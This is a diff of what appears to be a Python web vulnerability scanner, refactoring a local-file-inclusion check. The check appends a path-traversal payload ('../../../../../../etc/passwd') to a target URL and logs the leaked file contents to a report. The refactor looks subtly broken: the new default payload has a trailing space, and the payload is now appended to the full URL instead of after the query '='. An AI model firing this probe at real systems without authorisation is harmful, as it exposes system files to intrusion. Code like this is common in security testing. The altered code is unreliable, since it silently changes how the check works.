@@ -8,30 +8,28 @@ from CORE.util import write_to_report
 
 
 
-def fileInclude(url, output_file):
+def file_include(url,output_file, payload= "../../../../../../etc/passwd "):
     try:
-        deger = url.find("=")
-        response = url[:deger + 1] + "../../../../../../etc/passwd"
-        sonuc = requests.get(response, verify=False)
-        if "www-data" in sonuc.content:
-            print("[+]File include possible, payload: ../../../../../../etc/passwd")
-            print("Response: ", sonuc.content)
-            report = open(output_file, "a")
-            report_toadd = "[+]File include possible, payload: ../../../../../../etc/passwd\n"
-            report_toadd += "Response: "+sonuc.content+"\n"
-            report.write(report_toadd)
-            report.close()
+        response = requests.get(url + payload, verify=False)
+        
+        if "www-data" in response.text:
+            print("[+] File include possible, payload: " + payload)
+            print("Response: ", response.text)
+            with open(output_file, "a") as report:
+                report_to_add = "[+] File include possible, payload: " + payload + "\n"
+                report_to_add += "Response: " + response.text + "\n"
+                report.write(report_to_add)
         else:
-            print(
-                "[-]File include isn't possible, payload: ../../../../../../etc/passwd")
-            print("Response: ", sonuc.content)
-            report = open(output_file, "a")
-            report_toadd = "[-]File include isn't possible, payload: ../../../../../../etc/passwd\n"
-            report_toadd += "Response: "+sonuc.content+"\n"
-            report.write(report_toadd)
-            report.close()
-    except:
-        pass
+            print("[-] File include isn't possible, payload: " + payload)
+            print("Response: ", response.text)
+            with open(output_file, "a") as report:
+                report_to_add = "[-] File include isn't possible, payload: " + payload + "\n"
+                report_to_add += "Response: " + response.text + "\n"
+                report.write(report_to_add)
+    except requests.exceptions.RequestException as e:
+        print("Error: " + str(e))
+    except Exception as e:
+        print("An unexpected error occurred: " + str(e))
 
 
 def commandInjection(url, output_file):
